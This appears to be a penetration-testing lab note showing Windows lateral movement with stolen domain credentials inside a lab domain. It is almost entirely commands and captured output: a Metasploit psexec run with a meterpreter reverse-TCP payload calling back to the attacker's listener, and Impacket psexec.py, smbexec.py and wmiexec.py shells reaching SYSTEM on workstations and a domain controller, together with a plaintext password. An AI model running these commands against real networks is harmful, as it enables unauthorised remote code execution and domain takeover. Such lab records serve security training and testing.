# psexec

#### Metasploit

```
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting      Required  Description
   ----                  ---------------      --------  -----------
   RHOSTS                192.168.56.109       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445                  yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                        no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                       no        The service display name
   SERVICE_NAME                               no        The service name
   SMBDomain             planetexpress.local  no        The Windows domain to use for authentication
   SMBPass               Password1            no        The password for the specified username
   SMBSHARE                                   no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder shar
                                                        e
   SMBUser               hconrad              no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     eth0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
   
```

```
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 192.168.56.201:4444 
[*] 192.168.56.109:445 - Connecting to the server...
[*] 192.168.56.109:445 - Authenticating to 192.168.56.109:445|planetexpress.local as user 'hconrad'...
[*] 192.168.56.109:445 - Selecting PowerShell target
[*] 192.168.56.109:445 - Executing the payload...
[+] 192.168.56.109:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 192.168.56.109
[*] Meterpreter session 1 opened (192.168.56.201:4444 -> 192.168.56.109:50195) at 2022-06-22 14:01:04 +0800

meterpreter > shell
Process 388 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19044.1766]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && ipconfig
whoami && ipconfig
nt authority\system

Windows IP Configuration


Ethernet adapter Ethernet:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : local

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.56.109
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

```

#### psexec.py

```
kali@kali:~ $ psexec.py planetexpress.local/hconrad:Password1@192.168.56.109
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 192.168.56.110.....
[*] Found writable share ADMIN$
[*] Uploading file mVnYNAbT.exe
[*] Opening SVCManager on 192.168.56.110.....
[*] Creating service TIlW on 192.168.56.110.....
[*] Starting service TIlW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1766]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami && ipconfig
nt authority\system

Windows IP Configuration


Ethernet adapter Ethernet:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : local

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.56.110
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

C:\Windows\system32> exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on 192.168.56.110.....
[*] Stopping service TIlW.....
[*] Removing service TIlW.....
[*] Removing file mVnYNAbT.exe.....

```

#### smbexec.py

```
kali@kali:~ $ smbexec.py planetexpress.local/hconrad:Password1@192.168.56.109
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : local

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.56.109
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
   
```

#### wmiexec.py

This attack failed against the workstations .109 and .1110, but was successful against the DC at .108

```
kali@kali:~ # wmiexec.py planetexpress.local/hconrad:Password1@192.168.56.108
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
planetexpress\hconrad

C:\>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : local

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.56.108
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.100.101

```
